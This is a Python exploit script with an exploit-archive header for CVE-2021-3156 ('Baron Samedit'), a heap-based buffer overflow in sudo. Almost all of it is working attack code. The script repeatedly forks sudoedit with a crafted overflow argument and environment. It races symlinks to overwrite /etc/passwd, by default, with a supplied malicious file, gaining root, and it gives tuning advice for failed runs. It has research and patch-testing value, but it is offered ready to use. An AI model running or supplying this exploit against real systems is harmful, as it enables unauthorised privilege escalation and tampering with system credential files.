# Exploit Title: Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (1)
# Date: 2021-02-02
# Exploit Author: West Shepherd
# Version: Sudo legacy versions from 1.8.2 to 1.8.31p2, stable versions from 1.9.0 to 1.9.5p1.
# Tested on: Ubuntu 20.04.1 LTS Sudo version 1.8.31
# CVE : CVE-2021-3156
# Credit to: Advisory by Baron Samedit of Qualys and Stephen Tong (stong) for the C based exploit code.
# Sources:
# (1) https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit
# (2) https://github.com/stong/CVE-2021-3156
# Requirements: Python3

#!/usr/bin/python3
import os
import pwd
import time
import sys
import argparse


class Exploit(object):
    username = ''
    size = 0
    data = ''

    def __init__(self, source, target, sleep):
        self.sleep = sleep
        self.source = source
        self.target = target

    @staticmethod
    def readFile(path):
        return open(path, 'r').read()

    @staticmethod
    def getUser():
        return pwd.getpwuid(os.getuid())[0]

    @staticmethod
    def getSize(path):
        return os.stat(path).st_size

    def main(self):
        self.username = self.getUser()
        self.data = self.readFile(self.source)
        self.size = self.getSize(self.target)
        environ = {
            '\n\n\n\n\n': '\n' + self.data,
            'SUDO_ASKPASS': '/bin/false',
            'LANG':
'C.UTF-8@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            'A': 'A' * 0xffff
        }
        for i in range(5000):
            directory =
'AAAAAAAAAAAAAAAAAAAAAAAAAAAA00000000000000000000000000%08d' % i
            overflow =
'11111111111111111111111111111111111111111111111111111111%s' %
directory

            if os.path.exists(directory):
                sys.stdout.write('file exists %s\n' % directory)
                continue

            child = os.fork()
            os.environ = environ
            if child:
                sys.stdout.write('[+] parent %d \n' % i)
                sys.stdout.flush()
                time.sleep(self.sleep)
                if not os.path.exists(directory):
                    try:
                        os.mkdir(directory, 0o700)
                        os.symlink(self.target, '%s/%s' % (directory,
self.username))
                        os.waitpid(child, 0)
                    except:
                        continue
            else:
                sys.stdout.write('[+] child %d \n' % i)
                sys.stdout.flush()
                os.setpriority(os.PRIO_PROCESS, 0, 20)
                os.execve(
                    path='/usr/bin/sudoedit',
                    argv=[
                        '/usr/bin/sudoedit',
                        '-A',
                        '-s',
                        '\\',
                        overflow
                    ],
                    env=environ
                )
                sys.stdout.write('[!] execve failed\n')
                sys.stdout.flush()
                os.abort()
                break

            if self.size != self.getSize(self.target):
                sys.stdout.write('[*] success at iteration %d \n' % i)
                sys.stdout.flush()
                break
        sys.stdout.write("""
            \nConsider the following if the exploit fails:
            \n\t(1) If all directories are owned by root then sleep
needs to be decreased.
            \n\t(2) If they're all owned by you, then sleep needs
increased.
        """)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        add_help=True,
        description='* Sudo Privilege Escalation / Heap Overflow -
CVE-2021-3156 *'
    )
    try:
        parser.add_argument('-source', action='store', help='Path to
malicious "passwd" file to overwrite the target')
        parser.add_argument('-target', action='store', help='Target
file path to be overwritten (default: /etc/passwd)')
        parser.add_argument('-sleep', action='store', help='Sleep
setting for forked processes (default: 0.01 seconds')
        parser.set_defaults(target='/etc/passwd', sleep='0.01')

        options = parser.parse_args()
        if options.source is None:
            parser.print_help()
            sys.exit(1)

        exp = Exploit(
            source=options.source,
            target=options.target,
            sleep=float(options.sleep)
        )
        exp.main()
    except Exception as err:
        sys.stderr.write(str(err))
            
